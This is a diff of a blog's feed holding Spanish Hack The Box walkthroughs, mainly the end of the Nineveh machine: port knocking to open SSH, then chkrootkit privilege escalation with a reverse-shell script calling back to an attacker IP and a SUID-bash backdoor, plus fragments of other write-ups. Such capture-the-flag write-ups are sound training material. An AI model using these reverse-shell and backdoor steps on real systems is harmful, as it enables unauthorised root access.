+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ lsof &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;:4646
+COMMAND    PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+sshd    143226 k4miyo   10u  IPv6 451442      0t0  TCP localhost:4646 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LISTEN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+sshd    143226 k4miyo   11u  IPv4 451443      0t0  TCP localhost:4646 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LISTEN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora vamos a proceder a conectarnos vía ssh de manera local apuntando al puerto 4646 como el usuario &lt;strong&gt;amrois&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa amrois@127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4646
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'[127.0.0.1]:4646 ([127.0.0.1]:4646)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1]:4646&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
+Ubuntu 16.04.2 LTS
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+288 packages can be updated.
+207 updates are security updates.
+
+
+You have mail.
+Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
+amrois@nineveh:~$ whoami
+amrois
+amrois@nineveh:~$
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;amrois&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora, nos podríamos ahorrar lo anterior ya que si checamos el archivo  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc /knockd.conf&lt;/code&gt;, vemos que están configuradas unas reglas para hacer &lt;strong&gt;&lt;em&gt;Port Knocking&lt;/em&gt;&lt;/strong&gt;, es decir, probar si ciertos puertos se encuetran abiertos en un orden especifico para abrir otro puerto; para este caso, al validar los puertos en orden 571, 290 y 911, encontraremos el puerto 22 abierto de manera externa.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;knockd.conf 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;options]
+ logfile &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /var/log/knockd.log
+ interface &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ens160
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;openSSH]
+ sequence &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 571, 290, 911 
+ seq_timeout &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5
+ start_command &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /sbin/iptables &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; %IP% &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+ tcpflags &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; syn
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;closeSSH]
+ sequence &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 911,290,571
+ seq_timeout &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5
+ start_command &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /sbin/iptables &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; %IP% &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+ tcpflags &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; syn
+www-data@nineveh:/etc&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para hacerlo, vamos a hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knock&lt;/code&gt;, la cual la podemos instalar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-get install knockd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ knock 10.10.10.43 571:tcp 290:tcp 911:tcp
+❯ nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.43
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-28 21:29 CST
+Initiating Ping Scan at 21:29
+Scanning 10.10.10.43 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
+Completed Ping Scan at 21:29, 0.15s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 21:29
+Scanning 10.10.10.43 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Discovered open port 22/tcp on 10.10.10.43
+Completed SYN Stealth Scan at 21:29, 0.15s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.43
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.43 seconds
+           Raw packets sent: 5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;196B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;72B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El puerto 22 ya se encuentra abierto externamente. Una vez dentro, si enumeramos un poco el sistema como el usuario &lt;strong&gt;amrois&lt;/strong&gt; no vemos nada interesante, así que podemos pensar que se está ejecutando una tarea en intervalos regulares, así que vamos a crearnos nuestro archivo &lt;a href=&quot;/procmon&quot;&gt;ProcMon&lt;/a&gt;, ejecutarlo y ver que información nos reporta.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./procmon.sh                           
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;                                             
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /root/vulnScan.sh
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/bash /root/vulnScan.sh                                   
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh /usr/bin/chkrootkit
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh /usr/bin/chkrootkit                                   
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/echo a&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;      
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; c                                                     
+&amp;lt; /bin/sh /usr/bin/chkrootkit                                                                                                    
+&amp;lt; /bin/echo a&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;                                                                                                                  
+&amp;lt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; c                  
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh /usr/bin/chkrootkit
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/ps ax                 
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;^|[^A-Za-z0-9_]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;inetd&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;^A-Za-z0-9_]|&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;               
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;            
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; chkrootkit      
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh /usr/bin/chkrootkit                                   
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/bin/awk &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; print &lt;span class=&quot;nv&quot;&gt;$5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como vemos en los resultados obtenidos, se está ejecutando el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/chkrootkit&lt;/code&gt; cuyo propietario es el usuario &lt;strong&gt;root&lt;/strong&gt; y al investigar un poco vemos que &lt;strong&gt;Chrootkit&lt;/strong&gt; es un programa informático de consola, común en sistemas operativos Unix y derivados que permite localizar rootkits conocidos, realizando múltiples pruebas en las que busca entre los binarios modificados por dicho software. Si mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; buscamos dicho programa, encontraremos algunos exploits públicos para escalar privilegios. (&lt;strong&gt;Nota&lt;/strong&gt;: En el momento de ejecutar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;procmon.sh&lt;/code&gt; al parecer se encontraba otro usuario vulnerando la máquina, por eso vemos varios comandos que no son relacionados a la máquina).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit chkrootkit
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                 |  Path
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Chkrootkit - Local Privilege Escalation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                           | linux/local/38775.rb
+Chkrootkit 0.49 - Local Privilege Escalation                                                   | linux/local/33899.txt
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si leemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux/local/33899.txt&lt;/code&gt; nos indica que debemos poner un archivo ejecutable con nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;update&lt;/code&gt; dentro del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; y posteriormente ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chkrootkit&lt;/code&gt; (en este caso, ya el usuario &lt;strong&gt;root&lt;/strong&gt; lo hace por nosotros). Por lo que debemos crear un el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;update&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.27/443 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Le damos permisos de ejecución y nos ponemos en escucha por el puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.43] 56474
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;18487&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+root@nineveh:~# &lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;root
+root@nineveh:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt). Otra forma más cómoda sería asignarle permisos SUID a la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+s /bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Esperamos un rato y vemos que se han aplicado los permisos y accedemos como el usuario &lt;strong&gt;root&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
+&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 1037528 Jun 24  2016 /bin/bash
+amrois@nineveh:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+bash-4.3# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+bash-4.3#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><category term="Port_Knocking" /><category term="LFI" /><category term="Web" /><summary type="html">Resolución de la máquina Nineveh en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Mirai</title><link href="http://localhost:4000/htb-mirai/" rel="alternate" type="text/html" title="Hack The Box Mirai" /><published>2021-11-27T00:00:00-06:00</published><updated>2021-11-27T00:00:00-06:00</updated><id>http://localhost:4000/htb-mirai</id><content type="html" xml:base="http://localhost:4000/htb-mirai/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mirai/banner-mirai.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;mirai&quot;&gt;Mirai&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.48.&lt;/p&gt;
@@ -5153,361 +5726,4 @@ whoami
 C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;A este punto ya ingresamos a la máquina como &lt;strong&gt;nt authority\system&lt;/strong&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Blue en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Cap</title><link href="http://localhost:4000/htb-cap/" rel="alternate" type="text/html" title="Hack The Box Cap" /><published>2021-10-30T00:00:00-05:00</published><updated>2021-10-30T00:00:00-05:00</updated><id>http://localhost:4000/htb-cap</id><content type="html" xml:base="http://localhost:4000/htb-cap/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cap/banner-cap.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;cap&quot;&gt;Cap&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.245.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.245
-PING 10.10.10.245 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.245&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.245: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;65.6 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.245 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 65.616/65.616/65.616/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.245 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-08-22 19:29 CDT
-Initiating Ping Scan at 19:29
-Scanning 10.10.10.245 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 19:29, 0.10s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 19:29
-Scanning 10.10.10.245 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.10.245
-Discovered open port 21/tcp on 10.10.10.245
-Discovered open port 80/tcp on 10.10.10.245
-Completed SYN Stealth Scan at 19:29, 21.74s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.245
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.067s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65532 closed ports
-PORT   STATE SERVICE
-21/tcp open  ftp
-22/tcp open  ssh
-80/tcp open  http
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;22.09 seconds
-           Raw packets sent: 70068 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.083MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 70048 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.802MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.245
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,22,80
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-   8   │ 
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,80 10.10.10.245 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; target
-Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-08-22 19:31 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.245                            
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.066s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                     
-                                                                                                                                   PORT   STATE SERVICE VERSION                                                                                                       
-21/tcp open  ftp     vsftpd 3.0.3                                                                                                  
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                  
-| ssh-hostkey:                                                                                                                     
-|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                     
-|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                    
